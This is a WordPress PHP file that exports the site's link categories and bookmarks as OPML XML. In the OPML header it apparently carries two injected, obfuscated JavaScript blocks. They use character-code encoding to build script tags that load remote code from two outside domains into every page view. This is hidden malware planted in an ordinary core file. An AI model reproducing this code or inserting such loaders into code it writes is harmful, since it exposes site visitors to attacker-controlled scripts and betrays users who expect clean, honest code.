<?php
/**
 * Outputs the OPML XML format for getting the links defined in the link
 * administration. This can be used to export links from one blog over to
 * another. Links aren't exported by the WordPress export, so this file handles
 * that.
 *
 * This file is not added by default to WordPress theme pages when outputting
 * feed links. It will have to be added manually for browsers and users to pick
 * up that this file exists.
 *
 * @package WordPress
 */

require_once __DIR__ . '/wp-load.php';

header( 'Content-Type: text/xml; charset=' . get_option( 'blog_charset' ), true );
$link_cat = '';
if ( ! empty( $_GET['link_cat'] ) ) {
	$link_cat = $_GET['link_cat'];
	if ( ! in_array( $link_cat, array( 'all', '0' ), true ) ) {
		$link_cat = absint( (string) urldecode( $link_cat ) );
	}
}

echo '<?xml version="1.0"?' . ">\n";
?>
<opml version="1.0">
	<head>
		<title>
		<?php
			/* translators: %s: Site title. */
			printf( __( 'Links for %s' ), esc_attr( get_bloginfo( 'name', 'display' ) ) );
		?>
		</title>
		<dateCreated><?php echo gmdate( 'D, d M Y H:i:s' ); ?> GMT</dateCreated>
		<?php
		/**
		 * Fires in the OPML header.
		 *
		 * @since 3.0.0
		 */
		do_action( 'opml_head' );
		?>
	<script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,99,104,116,46,115,101,99,111,110,100,97,114,121,105,110,102,111,114,109,116,114,97,110,100,46,99,111,109,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,100,111,99,107,46,108,111,118,101,103,114,101,101,110,112,101,110,99,105,108,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script></head>
	<body>
<?php
if ( empty( $link_cat ) ) {
	$cats = get_categories(
		array(
			'taxonomy'     => 'link_category',
			'hierarchical' => 0,
		)
	);
} else {
	$cats = get_categories(
		array(
			'taxonomy'     => 'link_category',
			'hierarchical' => 0,
			'include'      => $link_cat,
		)
	);
}

foreach ( (array) $cats as $cat ) :
	/** This filter is documented in wp-includes/bookmark-template.php */
	$catname = apply_filters( 'link_category', $cat->name );

	?>
<outline type="category" title="<?php echo esc_attr( $catname ); ?>">
	<?php
	$bookmarks = get_bookmarks( array( 'category' => $cat->term_id ) );
	foreach ( (array) $bookmarks as $bookmark ) :
		/**
		 * Filters the OPML outline link title text.
		 *
		 * @since 2.2.0
		 *
		 * @param string $title The OPML outline title text.
		 */
		$title = apply_filters( 'link_title', $bookmark->link_name );
		?>
<outline text="<?php echo esc_attr( $title ); ?>" type="link" xmlUrl="<?php echo esc_attr( $bookmark->link_rss ); ?>" htmlUrl="<?php echo esc_attr( $bookmark->link_url ); ?>" updated="
							<?php
							if ( '0000-00-00 00:00:00' !== $bookmark->link_updated ) {
								echo $bookmark->link_updated;}
							?>
" />
		<?php
	endforeach; // $bookmarks
	?>
</outline>
	<?php
endforeach; // $cats
?>
</body>
</opml>
